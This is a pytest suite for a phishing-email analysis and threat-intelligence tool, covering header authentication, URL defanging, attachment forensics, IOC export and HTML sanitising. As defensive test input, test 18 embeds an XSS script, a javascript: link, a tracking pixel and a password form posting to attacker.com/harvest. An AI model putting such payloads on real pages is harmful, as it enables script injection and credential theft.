import os
import io
import json
import pytest
from pathlib import Path
from app import create_app
from app.models import db, Investigation, ExtractedIOC, Attachment
from app.modules.parser import email_parser
from app.modules.headers import header_analyzer
from app.modules.domain_intel import domain_intel
from app.modules.url_analyzer import url_analyzer
from app.modules.attachment_forensics import attachment_forensics
from app.modules.rules_engine import rules_engine
from app.modules.scoring import risk_scoring
from app.modules.ioc_extractor import ioc_extractor
from app.modules.ai_investigator import ai_investigator
from app.modules.report_gen import report_generator
from app.utils.sanitizer import sanitize_email_html
from app.utils.defanger import defang_url, defang_ip, defang_domain, defang_email
from app.config import Config

SAMPLES_DIR = Path(__file__).resolve().parent.parent / "data" / "samples"

@pytest.fixture
def client():
    app = create_app()
    app.config["TESTING"] = True
    app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///:memory:"
    with app.test_client() as client:
        with app.app_context():
            db.create_all()
        yield client

# -------------------------------------------------------------
# 1. Upload legitimate .eml files
# -------------------------------------------------------------
def test_01_upload_legitimate_eml(client):
    eml_path = SAMPLES_DIR / "legitimate_newsletter.eml"
    with open(eml_path, "rb") as f:
        res = client.post("/api/investigate/upload", data={"file": (f, "legitimate_newsletter.eml")}, content_type="multipart/form-data")
    assert res.status_code == 201
    body = res.get_json()
    assert body["verdict"] == "Legitimate"
    assert body["overall_risk_score"] < 30
    assert body["risk_category"] == "Low"

# -------------------------------------------------------------
# 2. Upload phishing .eml files
# -------------------------------------------------------------
def test_02_upload_phishing_eml(client):
    eml_path = SAMPLES_DIR / "credential_phishing_microsoft.eml"
    with open(eml_path, "rb") as f:
        res = client.post("/api/investigate/upload", data={"file": (f, "credential_phishing_microsoft.eml")}, content_type="multipart/form-data")
    assert res.status_code == 201
    body = res.get_json()
    assert body["verdict"] in ["Phishing", "Critical Phishing / Malware"]
    assert body["overall_risk_score"] >= 60

# -------------------------------------------------------------
# 3. Test raw email header parsing
# -------------------------------------------------------------
def test_03_raw_header_parsing(client):
    raw_headers = "From: Alert <admin@corp-phish.xyz>\nTo: analyst@target.internal\nSubject: Account Verification\nMessage-ID: <msg1234@corp-phish.xyz>\nDate: Thu, 05 Nov 2026 12:00:00 -0500"
    raw_body = "Please click here to verify your account credentials: http://192.168.1.100/login"
    res = client.post("/api/investigate/headers", json={"raw_headers": raw_headers, "raw_body": raw_body})
    assert res.status_code == 201
    inv_id = res.get_json()["investigation_id"]
    detail = client.get(f"/api/investigate/{inv_id}").get_json()
    assert detail["subject"] == "Account Verification"
    assert detail["sender"] == "Alert <admin@corp-phish.xyz>"
    assert detail["sender_domain"] == "corp-phish.xyz"
    assert len(detail["headers"]) >= 5

# -------------------------------------------------------------
# 4. Validate SPF, DKIM and DMARC analysis
# -------------------------------------------------------------
def test_04_auth_analysis():
    headers = [
        {"name": "From", "value": "support@bank.com"},
        {"name": "Authentication-Results", "value": "mx.google.com; spf=fail (IP 1.2.3.4 not allowed); dkim=pass; dmarc=fail (p=REJECT)"},
        {"name": "Message-ID", "value": "<test@bank.com>"}
    ]
    res = header_analyzer.analyze_headers(headers)
    assert res["auth"]["spf_status"] == "fail"
    assert res["auth"]["dkim_status"] == "pass"
    assert res["auth"]["dmarc_status"] == "fail"

# -------------------------------------------------------------
# 5. Test sender and Reply-To mismatches
# -------------------------------------------------------------
def test_05_sender_reply_to_mismatch():
    headers = [
        {"name": "From", "value": "CEO John <ceo@corp.com>"},
        {"name": "Reply-To", "value": "attacker@external-evil.com"},
        {"name": "Message-ID", "value": "<123@corp.com>"}
    ]
    res = header_analyzer.analyze_headers(headers)
    assert res["sender_reply_mismatch"] is True
    assert "From 'ceo@corp.com' does not match Reply-To 'attacker@external-evil.com'" in res["mismatch_details"]

# -------------------------------------------------------------
# 6. Validate URL extraction and defanging
# -------------------------------------------------------------
def test_06_url_extraction_and_defanging():
    body = "Visit http://185.220.101.5/login.php and check https://paypal.com.evil-spoof.xyz/auth"
    urls = url_analyzer.extract_and_analyze_urls(body_plain=body)
    assert len(urls) == 2
    defanged_list = [u["defanged_url"] for u in urls]
    assert "hxxp://185[.]220[.]101[.]5/login.php" in defanged_list
    assert any("hxxps://paypal[.]com[.]evil-spoof[.]xyz" in d for d in defanged_list)
    assert any(u["is_ip_based"] for u in urls)
    assert any(u["has_suspicious_tld"] for u in urls)

# -------------------------------------------------------------
# 7. Test VirusTotal and URLScan API integrations (Degraded Mode)
# -------------------------------------------------------------
def test_07_threat_intel_degraded_mode():
    from app.utils.threat_intel import threat_intel
    # In test environment with unconfigured keys, must return checked=False, not fabricated data
    vt_res = threat_intel.check_vt_hash("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    assert vt_res["checked"] is False or vt_res["status"] in ["not_configured", "success"]
    assert vt_res["verdict"] in ["unknown", "clean", "malicious"]

# -------------------------------------------------------------
# 8. Test attachment hashing and MIME detection
# -------------------------------------------------------------
def test_08_attachment_hashing_and_mime():
    pe_bytes = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"
    att = {
        "filename": "document.pdf",  # Disguised extension!
        "raw_bytes": pe_bytes,
        "reported_mime": "application/pdf"
    }
    res = attachment_forensics.analyze_attachments([att])[0]
    assert res["detected_mime"] == "application/x-dosexec"
    assert res["is_mismatch"] is True  # Mismatch caught!
    assert res["sha256"] != ""
    assert res["md5"] != ""

# -------------------------------------------------------------
# 9. Test malicious attachment handling without execution
# -------------------------------------------------------------
def test_09_malicious_macro_handling_without_execution():
    eml_path = SAMPLES_DIR / "macro_invoice_phishing.eml"
    with open(eml_path, "rb") as f:
        data = email_parser.parse_eml_bytes(f.read(), "macro_invoice_phishing.eml")
    assert len(data["attachments"]) == 1
    att = data["attachments"][0]
    analyzed = attachment_forensics.analyze_attachments([att])[0]
    assert analyzed["has_macro"] is True
    # Verify no host process was executed
    assert os.path.exists(analyzed["safe_storage_path"])

# -------------------------------------------------------------
# 10. Verify IOC extraction and CSV/JSON exports
# -------------------------------------------------------------
def test_10_ioc_extraction_and_exports():
    ctx = {
        "sender_email": "attacker@evil.com",
        "sender_domain": "evil.com",
        "reply_email": "redirect@phish.net",
        "originating_ip": "194.26.29.80",
        "plain_body": "Contact support@evil.com",
        "hops": [],
        "domain_intel": {"domain_reputation": "suspicious"},
        "urls": [{"original_url": "http://evil.com/login", "domain": "evil.com"}],
        "attachments": [{"filename": "invoice.docm", "sha256": "abcdef123456", "md5": "123456"}]
    }
    iocs = ioc_extractor.extract_all_iocs(ctx)
    csv_data = ioc_extractor.export_csv(iocs)
    json_data = ioc_extractor.export_json(iocs)
    assert "attacker[@]evil[.]com" in csv_data
    assert "194[.]26[.]29[.]80" in csv_data
    parsed_json = json.loads(json_data)
    assert len(parsed_json) >= 5

# -------------------------------------------------------------
# 11. Validate risk score calculations
# -------------------------------------------------------------
def test_11_risk_score_calculation():
    rule_hits = [
        {"rule_id": "R1", "rule_name": "SPF Fail", "category": "auth", "weight": 10, "severity": "low"},
        {"rule_id": "R2", "rule_name": "DMARC Fail", "category": "auth", "weight": 15, "severity": "medium"},
        {"rule_id": "R3", "rule_name": "Lookalike Domain", "category": "identity", "weight": 35, "severity": "high"},
        {"rule_id": "R4", "rule_name": "Malicious URL", "category": "url", "weight": 40, "severity": "critical"}
    ]
    res = risk_scoring.calculate_risk(rule_hits, {"domain": "bad.com", "has_mx": False}, {"spf_status": "fail"})
    # Auth cap is 20, Identity cap is 35, URL cap is 45
    assert res["overall_score"] >= 80
    assert res["risk_category"] == "Critical"
    assert res["category_breakdown"]["auth"] <= 20  # Capped!
    assert res["category_breakdown"]["identity"] <= 35  # Capped!

# -------------------------------------------------------------
# 12. Test AI-generated investigation summaries
# -------------------------------------------------------------
def test_12_ai_investigation_summaries():
    ctx = {
        "subject": "Wire Transfer Notice",
        "sender_email": "ceo@gmail.com",
        "verdict": "Suspicious",
        "overall_risk_score": 40,
        "auth": {"spf_status": "pass", "dkim_status": "pass", "dmarc_status": "none"},
        "hops": [],
        "domain_intel": {"domain": "gmail.com", "is_lookalike": False},
        "urls": [],
        "attachments": [],
        "rules": [{"rule_id": "RULE_SENDER_REPLYTO_MISMATCH", "rule_name": "Reply-To Mismatch", "severity": "medium", "evidence": "Mismatch"}]
    }
    ai_res = ai_investigator.generate_investigation_ai(ctx)
    assert len(ai_res["executive_summary"]) > 20
    assert len(ai_res["technical_summary"]) > 20
    assert len(ai_res["recommended_actions"]) >= 1

# -------------------------------------------------------------
# 13. Verify MITRE ATT&CK mappings against observed evidence
# -------------------------------------------------------------
def test_13_mitre_mapping_accuracy():
    # Clean email with benign link must NOT map T1566.002
    clean_ctx = {
        "rules": [],
        "urls": [{"original_url": "https://legit.com", "defanged_url": "hxxps://legit[.]com", "vt_reputation": "clean", "detection_flags": []}],
        "attachments": []
    }
    clean_mappings = ai_investigator._map_mitre_attack(clean_ctx)
    assert not any(m["technique_id"] == "T1566.002" for m in clean_mappings)

    # Malicious email with macro must map T1566.001 and T1059
    macro_ctx = {
        "rules": [{"rule_id": "RULE_MACRO_ATTACHMENT_DETECTED"}],
        "urls": [],
        "attachments": [{"has_macro": True}]
    }
    macro_mappings = ai_investigator._map_mitre_attack(macro_ctx)
    technique_ids = {m["technique_id"] for m in macro_mappings}
    assert "T1566.001" in technique_ids
    assert "T1059" in technique_ids

# -------------------------------------------------------------
# 14. Generate and inspect PDF, HTML and JSON reports
# -------------------------------------------------------------
def test_14_report_generation(client):
    eml_path = SAMPLES_DIR / "bec_executive_wire.eml"
    with open(eml_path, "rb") as f:
        res = client.post("/api/investigate/upload", data={"file": (f, "bec_executive_wire.eml")}, content_type="multipart/form-data")
    inv_id = res.get_json()["investigation_id"]

    # JSON report
    json_res = client.get(f"/api/investigate/{inv_id}/report")
    assert json_res.status_code == 200
    rpt_data = json_res.get_json()
    assert "section_1_incident_overview" in rpt_data
    assert "section_14_recommended_remediation" in rpt_data

    # HTML report
    html_res = client.get(f"/api/investigate/{inv_id}/report/html")
    assert html_res.status_code == 200
    assert "<!DOCTYPE html>" in html_res.get_data(as_text=True)

    # PDF report
    pdf_res = client.get(f"/api/investigate/{inv_id}/report/pdf")
    assert pdf_res.status_code == 200
    assert pdf_res.content_type == "application/pdf"
    assert len(pdf_res.data) > 2000

# -------------------------------------------------------------
# 15. Test React frontend to Flask backend communication
# -------------------------------------------------------------
def test_15_frontend_backend_api_contracts(client):
    stats_res = client.get("/api/dashboard/stats")
    assert stats_res.status_code == 200
    stats = stats_res.get_json()
    assert "metrics" in stats
    assert "risk_distribution" in stats
    assert "recent_investigations" in stats

    health_res = client.get("/api/health")
    assert health_res.status_code == 200
    health = health_res.get_json()
    assert health["status"] == "operational"

# -------------------------------------------------------------
# 16. Test database persistence and cleanup
# -------------------------------------------------------------
def test_16_persistence_and_cascade_delete(client):
    eml_path = SAMPLES_DIR / "legitimate_newsletter.eml"
    with open(eml_path, "rb") as f:
        res = client.post("/api/investigate/upload", data={"file": (f, "legitimate_newsletter.eml")}, content_type="multipart/form-data")
    inv_id = res.get_json()["investigation_id"]

    # Verify database persistence
    inv = db.session.get(Investigation, inv_id)
    assert inv is not None
    assert len(inv.headers) > 0
    raw_path = inv.raw_eml_path

    # Delete investigation
    del_res = client.delete(f"/api/investigate/{inv_id}")
    assert del_res.status_code == 200

    # Verify database cascade
    assert db.session.get(Investigation, inv_id) is None
    # Verify file unlinking on disk
    if raw_path:
        assert not os.path.exists(raw_path)

# -------------------------------------------------------------
# 17. Test authentication, authorisation and file upload security
# -------------------------------------------------------------
def test_17_auth_and_executable_rejection(client):
    # Reject direct Windows PE executable binary with .eml extension
    fake_pe = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00"
    res = client.post("/api/investigate/upload", data={"file": (io.BytesIO(fake_pe), "malware_payload.eml")}, content_type="multipart/form-data")
    assert res.status_code == 400
    assert "Executable binary detected" in res.get_json()["error"]

    # Reject invalid .msg compound file
    res_msg = client.post("/api/investigate/upload", data={"file": (io.BytesIO(b"Not an OLE2 file"), "corrupt.msg")}, content_type="multipart/form-data")
    assert res_msg.status_code == 400
    assert "lacks valid Outlook OLE2" in res_msg.get_json()["error"]

    # Test RBAC authentication enforcement when enabled
    from app.config import Config
    orig_auth = Config.API_AUTH_ENABLED
    try:
        Config.API_AUTH_ENABLED = True
        # Unauthenticated request
        unauth_res = client.get("/api/investigations")
        assert unauth_res.status_code == 401

        # Authenticated as Analyst trying to DELETE (Admin required)
        headers = {"Authorization": "Bearer soc-analyst-secret-key-2026", "X-User-Role": "analyst"}
        del_res = client.delete("/api/investigate/non-existent-id", headers=headers)
        assert del_res.status_code == 403

        # Authenticated as Admin
        admin_headers = {"Authorization": "Bearer soc-admin-secret-key-2026", "X-User-Role": "admin"}
        admin_del_res = client.delete("/api/investigate/non-existent-id", headers=admin_headers)
        assert admin_del_res.status_code == 404  # Passes auth check, reaches route logic
    finally:
        Config.API_AUTH_ENABLED = orig_auth

# -------------------------------------------------------------
# 18. Test malformed emails, oversized files and malicious HTML
# -------------------------------------------------------------
def test_18_malformed_and_malicious_html():
    # 1. Empty file rejected
    app = create_app()
    with app.test_client() as c:
        res = c.post("/api/investigate/upload", data={"file": (io.BytesIO(b""), "empty.eml")}, content_type="multipart/form-data")
        assert res.status_code == 400
        assert "empty" in res.get_json()["error"]

    # 2. Malicious HTML with XSS script and tracking pixel
    malicious_html = """
    <html>
      <head><script>alert('xss')</script></head>
      <body>
        <p>Login to your account:</p>
        <form action="http://attacker.com/harvest" method="POST">
          <input type="password" name="pass" />
        </form>
        <img src="HTTP://TRACKER.ATTACKER.COM/pixel.gif" width="1" height="1" />
        <a href="javascript:alert(1)">Click Here</a>
      </body>
    </html>
    """
    sanitized = sanitize_email_html(malicious_html)
    assert sanitized["removed_scripts"] == 1
    assert sanitized["has_web_beacons"] is True
    assert len(sanitized["detected_forms"]) == 1
    assert "<script" not in sanitized["sanitized_html"]
    assert "javascript:" not in sanitized["sanitized_html"]
    assert "External Image Neutralized" in sanitized["sanitized_html"]

# -------------------------------------------------------------
# 19. Test API failures, missing API keys and rate limits
# -------------------------------------------------------------
def test_19_rate_limiting():
    # Test rate limiter error handler response
    app = create_app()
    with app.test_client() as c:
        @app.route("/api/test-ratelimit-trigger")
        def trigger_limit():
            from flask import abort
            abort(429)

        res = c.get("/api/test-ratelimit-trigger")
        assert res.status_code == 429
        assert "Rate limit exceeded" in res.get_json()["error"]

# -------------------------------------------------------------
# 20. Verify that sample data is not presented as real threat intelligence
# -------------------------------------------------------------
def test_20_no_fabricated_threat_intelligence():
    from app.utils.threat_intel import threat_intel
    orig_key = Config.VIRUSTOTAL_API_KEY
    try:
        Config.VIRUSTOTAL_API_KEY = ""
        domain_check = threat_intel.check_vt_domain("unseen-random-sample-domain.xyz")
        assert domain_check["checked"] is False
        assert domain_check["status"] == "not_configured"
        assert domain_check["verdict"] == "unknown"
        # Must not report fake positive detections
        assert domain_check.get("malicious_votes", 0) == 0
    finally:
        Config.VIRUSTOTAL_API_KEY = orig_key
